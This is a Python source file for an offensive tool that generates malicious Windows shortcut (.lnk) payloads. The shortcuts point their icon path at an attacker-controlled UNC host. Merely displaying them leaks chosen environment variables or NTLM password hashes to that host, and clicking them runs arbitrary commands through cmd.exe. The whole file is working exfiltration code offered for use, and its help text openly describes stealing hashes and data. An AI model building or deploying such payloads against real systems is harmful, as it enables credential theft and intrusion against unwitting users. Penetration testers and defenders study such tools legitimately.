from __future__ import print_function

import argparse
import os
import random
import sys
import textwrap
from datetime import datetime

# Check if we're running windows
is_windows = sys.platform.startswith('win')

if is_windows:
    import win32com.client
else:
    try:
        import pylnk
    except ImportError:
        print("You must install liblnk's python bindings for non-windows machines!")
        sys.exit(1)

banner = r"""\
  ~==================================================~
##                                                    ##
##  /$$       /$$   /$$ /$$   /$$ /$$   /$$           ##
## | $$      | $$$ | $$| $$  /$$/| $$  | $$           ##
## | $$      | $$$$| $$| $$ /$$/ | $$  | $$  /$$$$$$  ##
## | $$      | $$ $$ $$| $$$$$/  | $$  | $$ /$$__  $$ ##
## | $$      | $$  $$$$| $$  $$  | $$  | $$| $$  \ $$ ##
## | $$      | $$\  $$$| $$\  $$ | $$  | $$| $$  | $$ ##
## | $$$$$$$$| $$ \  $$| $$ \  $$|  $$$$$$/| $$$$$$$/ ##
## |________/|__/  \__/|__/  \__/ \______/ | $$____/  ##
##                                         | $$       ##
##                                         | $$       ##
##                                         |__/       ##
  ~==================================================~
"""


def parse_cmd_line_args():
    parser = argparse.ArgumentParser(description='Generate a LNK payload')
    parser.add_argument(
        '--host',
        metavar='h',
        required=True,
        help='Where should we send our data?'
    )
    parser.add_argument(
        '--output',
        metavar='o',
        required=True,
        help='The name of the lnk file'
    )
    parser.add_argument(
        '--execute',
        metavar='e',
        default=[r'C:\Windows\explorer.exe .'],
        nargs='+',
        help=textwrap.dedent("""\
            What command should we execute when the shortcut is clicked?
            Default: None
        """)
    )
    parser.add_argument(
        '--vars',
        metavar='r',
        help=textwrap.dedent("""\
            What variables should we exfiltrate?
            Example: "PATH,COMPUTERNAME,USERNAME,NUMBER_OF_PROCESSORS"
        """)
    )
    parser.add_argument(
        '--type',
        metavar='t',
        default='all',
        choices=('environment', 'ntlm', 'all'),
        help=textwrap.dedent("""\
            The payload type to generate. Possible options:
              * environment - Will exfiltrate specified environment variables
              * ntlm - Will exfiltrate windows NTLM password hashes
              * all (default) - Will exfiltrate everything we can
        """)
    )
    args = parser.parse_args()
    if args.type != 'ntlm' and args.vars is None:
        raise ValueError(textwrap.dedent("""\
            You must specify environment variables to exfiltrate using --vars
            Alternatively, use another payload type with --type
        """))
    return args


def main(args):
    target = ' '.join(args.execute)

    if args.type == 'ntlm':
        icon = r'\\{host}\Share\{filename}.ico'.format(
            host=args.host,
            filename=random.randint(0, 50000)
        )
    else:
        args.vars = args.vars.replace('%', '').split(' ')
        path = '_'.join('%{0}%'.format(w) for w in args.vars)
        # Some minor anti-caching
        icon = r'\\{host}\Share_{path}\{filename}.ico'.format(
            host=args.host,
            path=path,
            filename=random.randint(0, 50000)
        )

    if is_windows:
        ws = win32com.client.Dispatch('wscript.shell')
        link = ws.CreateShortcut(args.output)
        link.Targetpath = r'C:\Windows\System32'
        link.Arguments = 'cmd.exe /c ' + target
        link.IconLocation = icon
        link.save()
    else:
        filepath = '{}/{}'.format(os.getcwd(), args.output)
        link = for_file(r'C:\Windows\System32\cmd.exe', filepath)
        link.arguments = '/c ' + target
        link.target = target
        link.icon = icon

        print('File saved to {}'.format(filepath))
        link.save(filepath)

    print('Link created at {} with UNC path {}.'.format(args.output, icon))


"""
These functions are helper functions from pylnk that assumed the lnk
file was for the same OS it was being created on. For our purposes, our
target is windows only, so I've adjusted them to assume a windows
target to avoid errors.
"""


def for_file(target_file, lnk_name=None):
    lnk = pylnk.create(lnk_name)

    levels = target_file.split('\\')
    elements = [levels[0]]
    for level in levels[1:-1]:
        segment = create_for_path(level, True)
        elements.append(segment)
    segment = create_for_path(levels[-1], False)
    elements.append(segment)
    lnk.shell_item_id_list = pylnk.LinkTargetIDList()
    lnk.shell_item_id_list.items = elements
    return pylnk.from_segment_list(elements, lnk_name)


def create_for_path(path, isdir):
    now = datetime.now()
    return {
        'type': pylnk.TYPE_FOLDER if isdir else pylnk.TYPE_FILE,
        'size': 272896,
        'created': now,
        'accessed': now,
        'modified': now,
        'name': path.split('\\')[0]
    }


if __name__ == '__main__':
    print(banner)
    cmd_line_args = parse_cmd_line_args()
    main(args=cmd_line_args)
